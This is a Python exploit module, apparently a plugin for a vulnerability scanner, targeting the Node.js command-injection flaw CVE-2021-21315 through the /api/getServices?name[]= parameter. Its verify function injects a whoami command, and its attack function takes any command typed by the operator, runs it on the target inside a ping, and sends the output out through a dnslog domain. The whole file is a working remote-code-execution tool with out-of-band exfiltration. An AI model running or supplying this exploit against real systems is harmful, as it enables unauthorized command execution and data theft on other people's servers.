import requests
import re
import urllib
import inc.dnslog
from urllib import parse

def verify(url):
    relsult = {
        'name': 'Node.js命令注入漏洞(CVE-2021-21315)',
        'vulnerable': False,
        'attack': True,
    }
    try:
        cmd = 'whoami'
        payload = '/api/getServices?name[]=%24({0})'.format(cmd)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        }
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=3)
        if re.search(cmd, req.text) and req.status_code == 200 and re.search('pcpu', req.text) and re.search('pmem', req.text):
            relsult['vulnerable'] = True
            relsult['method'] = 'GET'
            relsult['url'] = url
            relsult['payload'] = vurl
            relsult['about'] = 'https://blog.csdn.net/xuandao_ahfengren/article/details/115549714'
        return relsult
    except:
        return relsult


def attack(url):
    try:
        dnslog = inc.dnslog.Dnslog()
        dnslog_domain = dnslog.dnslog_getdomain()
        if dnslog_domain:
            print('[+] 检测到--dnslog参数, 尝试验证漏洞......')
            cmd_rex = '([^.]+).{0}'.format(dnslog_domain)
            print('[+] 获取到dnslog随机域名: ', dnslog_domain)
            cmd = ''
            base_payload = '/api/getServices?name[]=%24(ping `{0}`.' + dnslog_domain + ')'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            }
            cmd = input('[+] 执行命令 >')
            payload = base_payload.format(cmd)
            vurl = urllib.parse.urljoin(url, payload)
            try:
                requests.get(vurl, headers=headers, timeout=1)
            except:
                pass
            print('[+] 正在结合dnslog获取执行命令结果......')
            dnslog.dnslog_sleep()
            dnslog_rep_str = dnslog.dnslog_getrep()
            try:
                output = re.findall(cmd_rex, dnslog_rep_str)[0]
                print('[*] 成功获取到执行结果:', output)
            except:
                print('[-] 未获取到执行结果, 请手工验证命令是否执行成功？')
                return False
            return True
        else:
            print('[-] 需要结合dnslog平台进行验证，请追加 --dnslog 参数来运行此exp!!!')
            return False
    except:
        return False
